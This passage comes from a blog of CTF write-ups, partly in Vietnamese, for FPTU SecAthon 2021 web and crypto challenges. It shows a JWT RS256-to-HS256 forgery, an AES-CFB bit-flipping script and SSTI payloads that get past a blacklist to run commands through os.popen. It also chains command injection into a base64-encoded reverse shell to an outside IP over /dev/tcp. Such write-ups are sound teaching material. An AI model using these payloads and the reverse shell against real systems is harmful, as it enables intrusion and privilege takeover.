as admin. It impossible as normal. Now, intercept the request, I see the web use jwt token. Try to decode, I get the following result:The point this token is signed by RS256 algorithm. I google the current vulnerability of jwt token and found that there is critical vulnerability related to it, which can change the token by change algorithm from RS256 to HS256. You can learn more the attack at here as I will not reinvent the wheel 😄The last problem which parameter’s value we need to change? As we look from the jwt token, the only parameter that is most susceptible is username, as the other parameters are either non-determined or trivival for authorization. So, we need to change the value of username to admin to get the flag!2. Attack and get the flag:I use TokenBreaker on github to help me perform this attack. Everything I need is this to pull out the public key of server. It’s easy as we can get it by openssl.a) Get public key:The technical detail step as following: Connect to the server using openssl to get the public certificate:thangpd3160@kali:~$ openssl s_client -connect 139.180.213.39:443[REDACTED]---Server certificate-----BEGIN CERTIFICATE-----MIIDETCCAfmgAwIBAgIUaYCW/HwHq1b/axHRKM0BpixnwugwDQYJKoZIhvcNAQELBQAwGDEWMBQGA1UEAwwNY3J5cHRvMjAwLmNvbTAeFw0yMTEwMTQwMjM2NDBaFw0yMjEwMTQwMjM2NDBaMBgxFjAUBgNVBAMMDWNyeXB0bzIwMC5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDunk8oVD+9cKXT96aOdl/xZ5RqCpxsStFTf8l/DW2/m4X5scbhq8Qhco0Mvns75KYtCWAKSvwCzgTSMDcO1/Fzt6xRI4EZPtVSWE2Mq0VffFCYAzS6q07XWbFZ2tyFqbi/Xudh7tAA6TI098AGHKLjWZDJCA/ZbiQJu+7XL1y7TjCWBOEmrcWS7G1Cte1oUhUFfXygmskiTpxX+r3ABJuXT9FZcWu8ZMhlfMGp/y00sBDCp8xxAcIl/D5lAUzWKyyxW5g46s5WSRHkGpxX/uQUGMwV/WM3/199uvtVkQri88toQMzd03sWKJJZxuvJpwpw8vi/rbnB4c5/4wfuFjtHAgMBAAGjUzBRMB0GA1UdDgQWBBTmW/TdQlcea4S2DtpxVqa6n6jYFTAfBgNVHSMEGDAWgBTmW/TdQlcea4S2DtpxVqa6n6jYFTAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBUBWMa50jaKO5GtqdCe2jLhfmEgtc6iLr+XO8jGsK2OzaHTHO9N/mjDOJ0AAdINbCO2qfYsXBLTgzBLiAsE+IuzfxIiTmzVoLhiV0iWuy1NMXMEy1khAtVjdkxD1zxCdCw/xe70tmGEfVFGF45OPkdsbDa3fr6tSF2Cl7ZXehdpxuzogWAqV4zqn49XqLzZvB5gL5LbsbjzoUImce0eIxHgrkxM1RurgyN5EwV+SxkXCGxTmdMHI3Gzebft5xM393St030npRIRiAIpiLZUX7Yh7+PU079rE0wHtNvqorW+CrGD92TtYS7IufTE9PrY2ghO453/QM0jW/E429p/aha-----END CERTIFICATE-----subject=CN = crypto200.comissuer=CN = crypto200.com---[REDACTED] Save the certificate to files: Export public key from the certificate:thangpd3160@kali:~$ openssl x509 -pubkey -noout -in cf.pem &amp;gt; pubkey.pemThe public key may look as following:thangpd3160@kali:~$ cat pubkey.pem | xxd -p | tr -d &quot;\\\\n&quot;2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541377035504b46512f7658436c302f656d6a6e5a660a38576555616771636245725255332f4a66773174763575462b6248473461764549584b4e444c35374f2b536d4c516c67436b723841733445306a4133447466780a6337657355534f4247543756556c684e6a4b7446583378516d414d307571744f31316d785764726368616d347631376e59653751414f6b794e506641426879690a34316d51795167503257346b4362767531793963753034776c6754684a7133466b7578745172587461464956425831386f4a724a496b3663562f7139774153620a6c302f5257584672764754495a587a42716638744e4c41517771664d635148434a66772b5a51464d31697373735675594f4f724f566b6b5235427163562f376b0a46426a4d4666316a4e2f396666627237565a454b3476504c6145444d33644e3746696953576362727961634b63504c34763632357765484f662b4d48376859370a52774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0ab) Generate new token and submit to get flag: Run TokenBreaker tool to generate new token. Remember to change the value of username to admin. The new token is shorter than the origianl one.thangpd3160@kali:~$ python3 RsaToHmac.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2MzQ0ODE0OTIsIm5iZiI6MTYzNDQ4MjQ5MiwiZXhwIjoxNjM0NDg3NDkyLCJkYXRhIjp7ImlkIjoiMTM3IiwidXNlcm5hbWUiOiJ0aGFuZ3BkMTEiLCJlbWFpbCI6InRoYW5ncGQxMUBnbWFpbC5jb20ifX0.n7t8HqHsWYCdR4fk_-VPgRHtJuNKb1DGQPAGWcNrlaxjaRnft8fbPUOLBmgUD1xY6Xp0OL4ov4BuhvbzbOvjrAbzfjXq4MEDiadDxnObQr9c3gPrB82uoY3YyVqtg_TXa8yfz5HMWsMGpKg5QjRNVqWYCqF1-6-LNuLkp54mjPeJctcQHVONCy8tIpCR08E9_G4vpLEEYBPcXPkcD44FH56xnNUlMpDkTayhv5wZ-2nPuFiBsuNP_glp-6abAsDgMSbSHLSQc-mPEecTVx929lNHCjhzFIFqXEFdNNXt3Y3JWdx-VXIIUM2yfxKkubV8NCn8s9nfwXpbIMfIPA9rPQ -p pubkey.pem ___ ___ _ _ _ _ __ __ _ ___| _ \\/ __| /_\\ | |_ ___ | || | \\/ | /_\\ / __|| /\\__ \\/ _ \\ | _/ _ \\ | __ | |\\/| |/ _ \\ (__|_|_\\|___/_/ \\_\\ \\__\\___/ |_||_|_| |_/_/ \\_\\___|[*] Decoded Header value: {&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;}[*] Decode Payload value: {&quot;iat&quot;:1634481492,&quot;nbf&quot;:1634482492,&quot;exp&quot;:1634487492,&quot;data&quot;:{&quot;id&quot;:&quot;137&quot;,&quot;username&quot;:&quot;thangpd11&quot;,&quot;email&quot;:&quot;thangpd11@gmail.com&quot;}}[*] New header value with HMAC: {&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}[&amp;lt;] Modify Header? [y/N]: [&amp;lt;] Enter Your Payload value: {&quot;iat&quot;:1634481492,&quot;nbf&quot;:1634482492,&quot;exp&quot;:1634487492,&quot;data&quot;:{&quot;id&quot;:&quot;137&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;email&quot;:&quot;thangpd11@gmail.com&quot;}}[+] Successfully Encoded Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MzQ0ODE0OTIsIm5iZiI6MTYzNDQ4MjQ5MiwiZXhwIjoxNjM0NDg3NDkyLCJkYXRhIjp7ImlkIjoiMTM3IiwidXNlcm5hbWUiOiJhZG1pbiIsImVtYWlsIjoidGhhbmdwZDExQGdtYWlsLmNvbSJ9fQ.HuhcSbgVOFqbUGfY9KQ2g4thh_v4TuQioNujlMiXNOY Replace token value in burp request, then submit to get the flag:NoOneThis is the last challenge, but actually the easiest challenge ever. The idea of this challenge is just fipping one bit, so that is the role from user (1) to admin (0), then we got the flag. Full source code can be found at here.1. Challenge analysis:This challenge is same as the EasyOne challenge, we also need to login as admin, but can by normal register. The different is there is no /logincert anymore.Follow the code, the login_required function tell us that it extract the user role from the authtoken value in cookies:def login_required(f): @wraps(f) def wrap(*args, **kwargs): try: ciphertext = request.cookies.get(&#39;authtoken&#39;) userid = request.cookies.get(&#39;userid&#39;) if not ciphertext or not userid: return redirect(url_for(&#39;login&#39;)) encryptkey = get_encryptkey(userid) plainbytes = decrypt(ciphertext, encryptkey) usernamelen = int.from_bytes(plainbytes[:2], &quot;little&quot;) usernameencoded = plainbytes[2:usernamelen+2] username = usernameencoded.decode(&quot;utf-8&quot;) role = plainbytes[usernamelen+2] g.username = username g.role = role except: abort(401) return f(*args, **kwargs) return wrapFollow the code, I see that the authtokenvalue is encrypted using AES in CFB mode:def encrypt(plainbytes, key): iv = Random.new().read(AES.block_size) cipher = AES.new(key, AES.MODE_CFB, iv) cipherbytes = cipher.encrypt(plainbytes) ciphertext = base64.b64encode(iv + cipherbytes) return ciphertextAnd the value of authtoken is generated after we logon. I registered with username thangpd11, so that the role bytes value will lie in the first block.@app.route(&quot;/&quot;, methods=(&#39;GET&#39;, &#39;POST&#39;))def login(): if request.method == &#39;POST&#39;: username = request.form[&#39;username&#39;] password = request.form[&#39;password&#39;] if not username or not password: flash(&#39;Username and Password is required!&#39;) else: # verify login user = verify_login(username, password) if not user: flash(&#39;Username and Password is not correct!&#39;) else: userid = user[0] username = user[1] role = user[5] # get key key = base64.b64decode(user[4]) # create authtoken usernamebytes = username.encode(&#39;utf-8&#39;) usernamelen = len(usernamebytes) plainbytes = len(usernamebytes).to_bytes(2, &quot;little&quot;) + usernamebytes + role.to_bytes(1, &quot;little&quot;) ciphertext = encrypt(plainbytes, key) response = make_response(redirect(url_for(&#39;index&#39;))) response.set_cookie(&#39;userid&#39;, str(userid)) response.set_cookie(&#39;authtoken&#39;, ciphertext) return response return render_template(&#39;login.html&#39;)2. Bit Flipping Attack on AES CFBI take the folllowing from gooogle to help me easily illustrate the attack. The concept is actually very similar to the bit flipping attack on AES CBC (the classic one).The decryption process of the first block can be interpreted in mathematic formula as P₁ = E(IV) ⊕ C₁ or E(IV) = P₁ ⊕ C₁.The point is we wanna change P₁ to P₁’. Simply, we just need to change the C₁ value to another C₁’ value, such that E(IV) value remains. In mathematical formula, we can interpret the above words as:E(IV) = P₁ ⊕ C₁ = P₁’ ⊕ C₁’orP₁ ⊕ C₁ = P₁’ ⊕ C₁’3. Exploit and get the flagWith that in mind, now I code the exploit tool as follow. As I’m so lazy, I don’t code the full exploit, so I change the cookies value manually through Burp Suite:from Crypto import Randomfrom Crypto.Cipher import AESfrom base64 import b64decode, b64encodedef xor(a: bytes, b: bytes): return bytes([_a ^ _b for _a, _b in zip(a, b)])iv = Random.new().read(AES.block_size)key = Random.new().read(AES.block_size)cipher = AES.new(key, AES.MODE_CFB, iv)username = &#39;thangpd11&#39;role = 1usernamebytes = username.encode(&#39;utf-8&#39;)usernamelen = len(usernamebytes)plainbytes = len(usernamebytes).to_bytes(2, &quot;little&quot;) + usernamebytes + role.to_bytes(1, &quot;little&quot;)cipherbytes = b64decode(b&#39;tzRxbyN82l8uJK06ZdSQSI+kc1x1vnjPTLXL6w==&#39;) #authtoken in cookies valueiv = cipherbytes[:AES.block_size]cipherbytes = cipherbytes[AES.block_size:]new_role = 0plainbytes_new = len(usernamebytes).to_bytes(2, &quot;little&quot;) + usernamebytes + new_role.to_bytes(1, &quot;little&quot;)cipherbytes_new = xor(xor(plainbytes_new, plainbytes), cipherbytes)ciphertext_new = b64encode(iv + cipherbytes_new)print(ciphertext_new)The new authtoken is tzRxbyN82l8uJK06ZdSQSI+kc1x1vnjPTLXL6g==. Let’s submit it and get flag." }, { "title": "FPTU SecAthon 2021 | Web Writeup | PRP202", "url": "/posts/FuSec4-PRP202/", "categories": "CTF, Web Challenges", "tags": "writeups, web, fusec21", "date": "2021-10-13 12:30:00 +0700", "snippet": "PRP202 Một bài hay và cực khó với mình, chả trách người anh T giấu tên cứ bảo làm thử2 ngày để làm, nhiều lần thất bại, nhưng kết quả thật xứng đángSource code and analysisSource codeBắt đầu vào bài, tại trang index, Ctrl U lên thấy source code Flask của webapp = Flask(__name__, template_folder=&quot;template&quot;)SESSION_TYPE = &quot;filesystem&quot;app.config.from_object(__name__)Session(app)authCode = &quot;C4n 1 Trust Y0u? Player &quot;# Our bot detected that some users had gained access to the system by malicious function, so we decided to ban it.blacklist = [&quot;&#39;&quot;, &#39;&quot;&#39;, &quot;request&quot;, &quot;readlines&quot;, &quot;+&quot;, &quot;%2b&quot;, &quot;%22&quot;, &quot;%27&quot;, &quot;linecache&quot;]def authCheck(input): if session.get(input) == None: return &quot;&quot; return session.get(input)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def index(): try: session.pop(&quot;userCode&quot;) session.pop(&quot;winner&quot;) except: pass if request.method == &quot;POST&quot;: ok = request.form[&quot;ok&quot;] for ban in blacklist: if ban in request.form[&quot;name&quot;]: return render_template_string(&quot;Hacker Alert!!!&quot;) session[&quot;userCode&quot;] = request.form[&quot;name&quot;] if ok == &quot;Let&#39;s play!&quot;: session[&quot;check&quot;] = &quot;access&quot; # bypass this? No way haha :D winner = &quot;cocailonditconbamay&quot; session[&quot;winner&quot;] = winner return render_template_string( &quot;Generating winner hash...&amp;lt;script&amp;gt;setInterval(function(){ window.location=&#39;/doanxem&#39;; }, 500);&amp;lt;/script&amp;gt;&quot; ) return render_template(&quot;index.html&quot;)@app.route(&quot;/doanxem&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def doanxem(): try: if authCheck(&quot;check&quot;) == &quot;&quot;: return render_template_string(authCode + authCheck(&quot;userCode&quot;)) else: if request.method == &quot;POST&quot;: winner_input = request.form[&quot;winner&quot;] if winner_input == authCheck(&quot;winner&quot;): mess = ( &quot;You are the real winner!!!!!!!!!! &quot; + authCheck(&quot;userCode&quot;) + &quot;, here your flag: https://youtu.be/dQw4w9WgXcQ&quot; ) elif winner_input != authCheck(&quot;winner&quot;): mess = &quot;Wrong! You die!&amp;lt;script&amp;gt;setInterval(function(){ window.location=&#39;/choilai&#39;; }, 1200);&amp;lt;/script&amp;gt;&quot; return render_template_string(mess) return render_template(&quot;doanxem.html&quot;) except: pass return render_template_string(authCode + authCheck(&quot;userCode&quot;))@app.route(&quot;/choilai&quot;)def reset_access(): try: session.pop(&quot;check&quot;) return render_template_string( &quot;You got an Extra Change. Gud luck :D!!!!!!&amp;lt;script&amp;gt;setInterval(function(){ window.location=&#39;/&#39;; }, 500);&amp;lt;/script&amp;gt;&quot; ) except: pass return render_template_string(authCode + authCheck(&quot;userCode&quot;))if __name__ == &quot;__main__&quot;: app.secret_key = &quot;###########&quot; serve(app, host=&quot;0.0.0.0&quot;, port=8900)AnalysisCó render_template_string() nên rất dễ đoán đây là SSTINhưng vì đã bị chặn request.args nên chắc phải inject từ một input nào đó :vReview lại source code thì ta thấy có 2 chỗ render_template_string() cần sử dụng authCheck(&quot;userCode&quot;), chính là cái tên ta nhập ở indexỞ doanxem() ta thấy mess là một đoạn code chuyển hướng sang /choilaiSang đến choilai() thì ta thấy rằng nó sẽ pop cái mục check của session data, vậy câu hỏi ở đây là, nếu như ta để cho doanxem gửi một request sang /choilai, nhưng trước khi /choilai kịp render, ta drop cái request đó? Tất nhiên cái session.pop(&quot;check&quot;) vẫn được thực thi, nhưng không render. Và nếu ta gửi tiếp một request của doanxem vào /choilai, điều gì sẽ xảy ra? session.pop() sẽ lỗi vì đã pop trước đó, nên giờ không còn gì mà pop, và thay vì render ra chuyển hướng về index, thì đoạn render cuối sẽ được thực thi.Đã rõ cách để trigger template, thử nhập {{7*7}} ở index và làm các bước như trên:ExploitVậy là đã rõ, bây giờ việc cần làm là tạo ra payload, trước tiên, hãy review cái black list của source code đã:blacklist = [&quot;&#39;&quot;, &#39;&quot;&#39;, &quot;request&quot;, &quot;readlines&quot;, &quot;+&quot;, &quot;%2b&quot;, &quot;%22&quot;, &quot;%27&quot;, &quot;linecache&quot;]Đoạn này khá là khó, vì black list chứa những kí tự và từ khóa phổ biến để tạo payload SSTISuy nghĩ mãi làm thế nào để tạo payload thì người anh TungDLM bảo chr, sáng dạ thêm một tíCụ thể thì ta sẽ dùng chr() để tạo các kí tự trong string và ghép chúng lại, nhưng trước tiên, phải define nóThử nhập ().__class__.__base__.__subclasses__() để list các subclass và mình thấy, tại vị trí 80 có &amp;lt;class &#39;_frozen_importlib._ModuleLock&#39;&amp;gt;, có thể sử dụng nó để define chr:{% set ().__class.__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__.chr %}Đoạn này phải cảm ơn 3 chữ s e t của anh TaiDH, một pro đã giải bài này trong 15 phút, trước cả mìnhOk, để đoạn define ở đó, bây giờ đến đoạn payload chính, có rất nhiều hướng làm:Sử dụng cycler, __doc__ và replace (TungDLM):{{cycler.__init__.__globals__.os.popen(().__doc__[36:41].replace(chr(97),chr(99)).replace(chr(114),chr(97)).replace(chr(103),chr(116)).replace(chr(117),chr(32)).replace(chr(109),chr(42))).read()}}Dễ hiểu là, chúng ta sẽ lợi dụng đoạn __doc__ của Tuple, ví __doc__ là một String nên ta chỉ việc cắt một đoạn của nó ra, replace() để thay thế các kí tự, sử dụng chr() để thay cho việc dùng &#39;&#39;/&quot;&quot;. Nhờ đó tạo được câu lệnh để os.open() thực thi (cat *) và in ra tại read()Payload hoàn chỉnh:{% set chr = ().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__.chr %}{{cycler.__init__.__globals__.os.popen(().__doc__[36:41].replace(chr(97),chr(99)).replace(chr(114),chr(97)).replace(chr(103),chr(116)).replace(chr(117),chr(32)).replace(chr(109),chr(42)))}}Sử dụng __add__ (by me):{{().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__.open(chr(97).__add__(chr(112).__add__(chr(112).__add__(chr(46).__add__(chr(112).__add__(chr(121)))))))}}Tại đây mình sử dụng __add__ để nối các kí tự thành chuỗi và open() để mở file, không khuyến khích làm theo, khổ dâm lắm :’(Payload hoàn chỉnh:{% set chr = ().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__.chr %}{{().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__.open(chr(97).__add__(chr(112).__add__(chr(112).__add__(chr(46).__add__(chr(112).__add__(chr(121)))))))}}Flag:Flag: FUSEC{@@@@@@Th3_n3Xt_l3v3l_pL4y!!!!!!!!} Rất có thể có nhiều cách khác, vì anh TungDLM đã để nhả Cảm ơn anh TungDLM và anh TaiDH đã hỗ trợ trong quá trình giải bài nàyReferences: https://doantung99.medium.com/fpt-night-wolf-ctf-writeup-de43925ed84b, WU của anh TungDLM trong giải NightWolf-CTF do SAS tổ chức, trong đó có bài XSMB, cùng SSTI tương tự, tại bài đó, anh Tùng có đính kèm 2 link tham khảo https://chowdera.com/2020/12/20201221231521371q.html, đây là bài viết mình tham khảo rất rất nhiều, chi tiết và có thêm 3 đoạn code viết bằng python giúp tìm vị trí các class dễ hơn, một số trick bypass filter, nên tham khảo https://portswigger.net/research/server-side-template-injection, đây là bài viết của Jame Kettle về SSTI, nếu nhớ không nhầm chính ông này nghiên cứu ra SSTI, nên đọc nếu chưa biết nhiều về SSTI " }, { "title": "FPTU SecAthon 2021 | Web Writeup | PRP201", "url": "/posts/FuSec4-PRP201/", "categories": "CTF, Web Challenges", "tags": "writeups, web, fusec21", "date": "2021-10-10 23:30:00 +0700", "snippet": "PRP201 Đây là challenge mà mình đã đoán được một phần, nhưng vẫn mất gần 1 ngày để giải ra :&amp;lt; Một sản phẩm đến từ anh Khoa (matuhn) Truy cập vào bài thì thấy có 5 đường dẫn đến 5 file txt Thử truy cập vào một trong số đó sẽ thấy URL có dạng: http://139.180.208.121:8001/getData?f=/fus/data/1.txt, liệu đây có phải path traversal? có vẻ như các anh ra đề năm nay khá thích path traversal Mò mẫm một lúc thì mình tìm được file flag.txt cũng trong /fus/data :D với nội dung như sau: Vậy là cần phải làm cách nào đó để xem được cái secret_service đó Đến đây thì mình bắt đầu bí rồi, path traversal thì cũng cần phải biết có những gì trong đó chứ (hoặc ít nhất là mình nghĩ vậy), cho tới khi ban ra đề cho hint đầu tiên: ?f=/fus/data/../app.py, vậy hãy xem source code này có vấn đề gì? Vì source khá dài nên mình sẽ phân tích từng hàm một, bỏ qua hàm index, vì nó in ra trang mà chúng ta truy cập vào đầu tiên @app.route(&#39;/getData&#39;, methods=[&#39;GET&#39;]) def getLog(): log_file = flask.request.args.get(&#39;f&#39;) if (log_file.startswith(&#39;/fus/data&#39;)): return flask.send_file(log_file, mimetype=&#39;text/plain&#39;, as_attachment=False) else: return ({&#39;status&#39;: &#39;invalid path&#39;},200) Ok, đây chính là hàm mà chúng ta dùng để đọc file và thực hiện path traversal, không có nhiều điều để nói về nó. # run script to crawl data @app.route(&#39;/runScript&#39;) def runScript(): json = flask.request.json msg = start(json) return ({&#39;status&#39;: msg},200) def check_script_dup(scripts, command_log, json): try: script_parent_dir = scripts + &#39;/&#39; + json[&#39;dir&#39;] script_path = script_parent_dir + &#39;/&#39; + json[&#39;name&#39;] except: return &quot;missing dir and name&quot; if os.path.exists(script_path): return &quot;duplicate script&quot; else: if not os.path.exists(script_parent_dir): os.makedirs(script_parent_dir) return download_script(script_path, command_log, json) def download_script(script_path, command_log, json): try: script_link = json[&#39;url&#39;] except: return &quot;missing url&quot; # don&#39;t trust anyone if (urllib.parse.urlparse(script_link).netloc == &quot;localhost:8888&quot;): result = requests.get(script_link) with open(script_path, &#39;wb&#39;) as f: f.write(result.content) run_script(script_path, command_log) else: return &quot;invalid script link&quot; def run_script(script_path, command_log): lf = open(command_log, &#39;wb+&#39;) command = subprocess.Popen([&#39;bash&#39;, script_path], stderr=lf, stdout=lf, universal_newlines=True) return &quot;Run successfully&quot; def start(json): scripts = home + &#39;/scripts&#39; log = home + &#39;/logs&#39; if not os.path.exists(scripts): os.makedirs(scripts) if not os.path.exists(log): os.makedirs(log) try: command_log = log + &#39;/&#39; + json[&#39;command_log&#39;] + &#39;.txt&#39; except: return &quot;missing command_log&quot; msg = check_script_dup(scripts, command_log, json) return msg Mình sẽ để cả 5 hàm này chung với nhau, vì chúng liên quan mật thiết với nhau, và cũng là tiền đề cho mọi thứ Ta có thứ tự như sau: runScript() nhận json từ request và truyền cho hàm start() start() xử lý việc tạo ra đường dẫn thư mục cho logs, scripts và tạo file command_log và đưa vào hàm check_script_dup() check_script_dup() nôm na thì kiểm tra xem file script đã tồn tại hay không, nếu tồn tại thì tất nhiên là không cần mất công đến hàm tiếp theo, hàm download_script() download_script() là phần sẽ “tạo ra nội dung file”, bằng cách nhập file từ url trong JSON vào file script, ở đây ta biết được rằng, url đó sẽ có dạng http://localhost:8888/anything_else vì đoạn #dont trust anyone, hãy nhớ điều này Sau khi download_script() hoàn tất, hàm run_script() được khởi động, hàm này sẽ chạy một câu lệnh bash &amp;lt;script_bash&amp;gt;, và từ đây ta hiểu được 2 điều: script_bash là tên file được thực thi bới lệnh bash, có nội dung được nhập từ nôi dung file trên url của JSON truyền vào command_log chính là file log của stdout và stderr, như vậy khi thực thi, output và thông báo lỗi của bash đều sẽ đẩy vào file log đó, và tất nhiên, ta có thể xem file log đó qua path traversal Đến đây thì mình (và tin chắc ai đó khi xem WU này), chắc hẳn đều đã nghĩ ra rồi, tác giả cũng đã ra hint suprocess.Popen(), stderr, stdout là gì? rồi :v Mình thử luôn nhé :v Như ở trên ta đã có JSON bao gồm dir, name, command_log, url URL để nhận file JSON là http://139.180.208.121:8001/runScript, để gửi JSON lên thì mình sử dụng curl như sau: curl -X GET http://139.180.208.121:8001/runScript -H &#39;Content-Type: application/json&#39; -d &#39;{json}&#39; Mình sẽ thử tạo một JSON như sau: { &quot;dir&quot; : &quot;test&quot;, &quot;name&quot; : &quot;ls&quot;, &quot;command_log&quot; : &quot;log&quot;, &quot;url&quot; : &quot;http://localhost:8888/&quot; } Ghép lại với curl: curl -X GET http://139.180.208.121:8001/runScript -H &#39;Content-Type: application/json&#39; -d &#39;{&quot;dir&quot; : &quot;test&quot;, &quot;name&quot; : &quot;ls&quot;, &quot;command_log&quot; : &quot;log&quot;, &quot;url&quot; : &quot;http://localhost:8888/&quot;}&#39; Và sau khi gửi, truy cập vào http://139.180.208.121:8001/getData?f=/fus/data/../logs/log.txt để xem kết quả của câu lệnh là gì (ta biết logs cùng chung thư mục cha với data khi xem code): Có thể thấy rằng, nội dung file chínhlog.txt chính là biến script_path được ra thêm cả response của index(), chúng trên một dòng nên sẽ bị lỗi, thử đổi ls thành \\nls\\n ở JSON và gửi lên, sẽ thấy sự khác biệt: Thấy rõ là ls đã thụt xuống, vậy điều này có ý nghĩa gì? bash &amp;lt;filename&amp;gt; khi chạy sẽ chạy từ trên xuống như các ngôn ngữ lập trình, nhưng có một điều đặc biệt là, hàng nào lỗi, nó sẽ in ra lỗi và chạy hàng tiếp theo, chứ không dừng lại khi gặp lỗi syntax bên trong Đến đây thì mình đã nhận ra, hàm download_script(), vậy sẽ ra sao nếu mình truyền vào url trong JSON là http://localhost:8888/getData?f=/fus/data/../logs/log.txt (nên lưu ý localhost ở đây là local của server :&amp;gt; ), thì có phải download_script() sẽ lấy nội dung của log.txt để đưa vào script_path? Như vậy mình tạo JSON mới và lệnh curl mới như sau: { &quot;dir&quot; : &quot;test&quot;, &quot;name&quot; : &quot;ls.sh&quot;, &quot;command_log&quot; : &quot;lssh&quot;, &quot;url&quot; : &quot;http://localhost:8888/getData?f=/fus/data/../logs/log.txt&quot; } curl -X GET http://139.180.208.121:8001/runScript -H &#39;Content-Type: application/json&#39; -d &#39;{&quot;dir&quot; : &quot;test&quot;, &quot;name&quot; : &quot;ls.sh&quot;, &quot;command_log&quot; : &quot;lssh&quot;, &quot;url&quot; : &quot;http://localhost:8888/getData?f=/fus/data/../logs/log.txt&quot;}&#39; Và gửi đi, giờ chỉ cần mở file lssh.txt bằng path traversal và thu được kết quả: Vậy là chính xác rồi, nhưng có một vấn đề là ta cần tìm đến /root để mở file secret_service, và tất nhiên là phải root thì mới có thể làm được điều đó (mình đã thử rồi) Mụ mẫm cả đầu thì anh T giấu tên và anh Khoa (tác giả) đã gợi ý về reverse shell Vậy bây giờ chỉ cần dùng cách trên, tạo một file chạy một đoạn reverse shell và chúng ta sẽ chiếm quyền thông qua SUID (hint từ tác giả) là xong Nhưng, mình đã thử và nhận ra, tất cả những command mà chứa dấu ‘/’ thì lỗi 500 là rõ, như ở dưới mình để name trong JSON là \\nls ../root\\n: Vậy là mình cần cách khác, nhưng trước tiên, phải chuẩn bị cái reverse shell đã :D sh -i &amp;gt;&amp;amp; /dev/tcp/34.92.153.161/8899 0&amp;gt;&amp;amp;1 Có cả revshell của bash, nc, …, tìm hiểu tại đây Vẫn là tác giả đã gợi ý cho mình một cách để đẩy được revshell kia lên, sử dụng base64, chuyển đoạn shell ở trên thành base64 encode, và đưa về dạng sau: echo &quot;c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjEK&quot; | base64 -d | bash Vậy là xong, giờ cần chuẩn bị request đầu tiên (hãy nhớ escape string :v): { &quot;dir&quot; : &quot;rev&quot;, &quot;name&quot; : &quot;\\necho \\&quot;c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjE=\\&quot; | base64 -d | bash\\n&quot;, &quot;command_log&quot; : &quot;rev&quot;, &quot;url&quot; : &quot;http://localhost:8888/&quot; } curl -X GET http://139.180.208.121:8001/runScript -H &#39;Content-Type: application/json&#39; -d &#39;{&quot;dir&quot; : &quot;rev&quot;,&quot;name&quot; : &quot;\\necho \\&quot;c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjE=\\&quot; | base64 -d | bash\\n&quot;,&quot;command_log&quot; : &quot;rev&quot;,&quot;url&quot; : &quot;http://localhost:8888/&quot;}&#39; Gửi đi, và trước khi đến với lần request thứ 2, mình phải tạo một listener trên máy của mình đã (thực ra là VPS mình mượn của một người bạn xứ cảng): nc -lvnp 8899 Giờ để listener ở đó, ta quay lại với request thứ 2, request để chạy revshell: { &quot;dir&quot; : &quot;rev_tcp&quot;, &quot;name&quot; : &quot;rev_tcp.sh&quot;, &quot;command_log&quot; : &quot;rev&quot;, &quot;url&quot; : &quot;http://localhost:8888/getData?f=/fus/data/../logs/rev.txt&quot; } curl -X GET http://139.180.208.121:8001/runScript -H &#39;Content-Type: application/json&#39; -d &#39;{&quot;dir&quot; : &quot;rev_tcp&quot;,&quot;name&quot; : &quot;rev_tcp.sh&quot;,&quot;command_log&quot; : &quot;rev&quot;,&quot;url&quot; : &quot;http://localhost:8888/getData?f=/fus/data/../logs/rev.txt&quot;}&#39; Và gửi đi, rồi quay lại listener: Vậy là ta đã mở được reverse shell trên server Bây giờ chỉ cần tiến hành leo thang đặc quyền thôi: Ta có flag: &quot;FUSec{a9595511e650bb0ff367d8144818802b}&quot; Cảm ơn anh Khoa và anh T giấu tên (không lừa) đã luôn hỗ trợ, đấm mồm thằng em để em có thể giải được bài này Mình cũng xin cảm ơn người bạn đến từ đất cảng Mai Kim Long, mặc dù chỉ quen biết qua mạng xã hội nhưng vẫn dám cho mình mượn tài khoản GCP để làm bài này, thanks bro!" }, { "title": "FPTU SecAthon 2021 | Cryptographic Writeup | CRY302 &amp; CRY303", "url": "/posts/FuSec4-CRY302-CRY303/", "categories": "CTF, Cryptographic Challenges", "tags": "writeups, cryptographic, fusec21", "date": "2021-10-10 11:00:00 +0700", "snippet": "CRY302Một bài liên quan tới hash, cách thực hiện khá dễ. Full source code bạn có thể xem tại đâyBổ đềTóm tắt lại thì mình sẽ được đưa cho 1 số tiền ngẫu nhiên từ 1 tới 2000 và bị bắt phải mua 1 cái FLAG có giá tận 99,999. Kiểu gì cũng không đủ cho được.Khi mình order 1 vật phẩm bất kỳ, order của mình sẽ có cấu trúc dạng kiểu product=FLAG&amp;amp;price=99999&amp;amp;time=1633845957.70&amp;amp;sign=67df43a8c83ea4ee53ac7bb61cc9a51661f5b55b54153afb942246c11a3ab9a93cb7a1cecb235195eab957fceb3e3daaf3e97f484d29718aea8b0f63e1a3704a (đã được decode từ chuỗi base64 encoded).Khi nhập lại cái order ở trên để xác nhận mua sản phẩm, order này được kiểm tra các cấu trúc và tính toàn vẹn, cụ thể gồm: Tồn tại cặp parameter-value sign={sign_value} Có signature hợp lệ sha512(signkey+payment).hexdigest() == signature Sau khi qua các bài check trên, payment sẽ được truyền vào hàm parse_sql(self, query) để tiến hành extract các parameter tương ứng.def 